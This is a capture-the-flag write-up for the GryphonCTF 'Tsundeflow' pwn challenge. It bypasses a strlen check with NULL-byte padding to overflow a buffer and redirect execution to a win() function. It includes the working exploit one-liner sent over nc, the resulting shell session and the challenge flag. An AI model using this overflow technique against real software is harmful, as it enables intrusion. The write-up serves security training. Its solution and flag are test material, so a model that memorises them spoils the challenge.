# Tsundeflow
Pwn - 80 points

## Challenge 
> This one is a handful.

> Connect: `pwn2.chal.gryphonctf.com 17343`

> Creator - @LFlare

[tsundeflow-75e745682647a9e6794491e56f5504d5.c](tsundeflow-75e745682647a9e6794491e56f5504d5.c)
[tsundeflow-redacted-fb0908a3d9a30c4029acfdfd5bdbe313](tsundeflow-redacted-fb0908a3d9a30c4029acfdfd5bdbe313)

## Solution
Vulnerability is in `strlen`, which checks for length of string until a NULL character.
We can bypass it by filling the buffer with NULLs (`\x00`).

Fuzz for the offset length, which is 36.

	$ python -c 'print "\x00"*36 + "ABCD"' | strace ./tsundeflow-redacted-fb0908a3d9a30c4029acfdfd5bdbe313
	...
	--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x44434241} ---
	+++ killed by SIGSEGV +++
	Segmentation fault
		
Get the address of `win()`
	
	$ gdb ./tsundeflow-redacted-fb0908a3d9a30c4029acfdfd5bdbe313 
	...
	(gdb) break win
	Breakpoint 1 at 0x804857e


This is the final exploit

	$ (python -c 'print "\x00"*36 + "\x7e\x85\x04\x08"' && cat) | nc pwn2.chal.gryphonctf.com 17343
	I check input length now! Your attacks have no effect on me anymore!!!
	Your response? B-baka! It's not like I like you or anything!
	ls
	flag.txt
	tsundeflow
	cat flag.txt
	GCTF{51mpl3_buff3r_0v3rfl0w_f0r_75und3r35}

## Flag
`GCTF{51mpl3_buff3r_0v3rfl0w_f0r_75und3r35}`